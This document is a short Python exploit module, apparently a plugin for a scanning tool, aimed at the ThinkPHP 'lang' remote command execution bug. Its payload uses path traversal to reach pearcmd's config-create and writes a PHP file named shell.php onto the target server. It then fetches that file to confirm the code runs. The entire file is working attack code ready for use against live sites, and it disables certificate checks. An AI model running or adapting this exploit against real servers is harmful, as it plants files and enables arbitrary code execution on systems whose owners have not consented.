#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/CdDZISb8QKbfp6FwP-OQKg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'thinkphp lang远程命令执行',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Pragma': 'no-cache',
      'Cache-Control': 'no-cache',
      'Upgrade-Insecure-Requests': '1',
     ' Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
      }
  target = '/?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+shell.php'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    resp = requests.get(url=url+'/shell.php',headers=headers,timeout=5,verify=False)
    if resp.status_code == 200 and "phpinfo()" in resp.text:
      # ret['huixian'] = res.text
      resp.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret